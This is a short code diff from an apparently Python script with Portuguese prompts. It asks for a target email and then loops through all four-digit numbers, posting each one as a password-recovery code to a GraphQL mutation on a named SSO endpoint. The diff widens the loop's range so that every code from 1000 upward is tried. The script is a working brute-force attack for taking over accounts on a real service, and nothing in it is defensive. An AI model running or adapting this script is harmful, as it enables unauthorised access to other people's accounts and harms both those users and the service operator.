@@ -13,7 +13,7 @@ headers = {
 }
 
 email = input("Digite o email:>")
-for numero in range(1111,10000):
+for numero in range(1000,10000):
 	data = '{"operationName":"checkRecoveryPasswordCode","variables":{"user":"%s","code":%i},"query":"mutation checkRecoveryPasswordCode($user: String!, $code: Int!) {\\n  checkRecoveryPasswordCode(user: $user, code: $code)\\n}\\n"}'% (email, numero)
 
 	response = requests.post('https://sso.plurall.net/graphql', headers=headers, data=data)
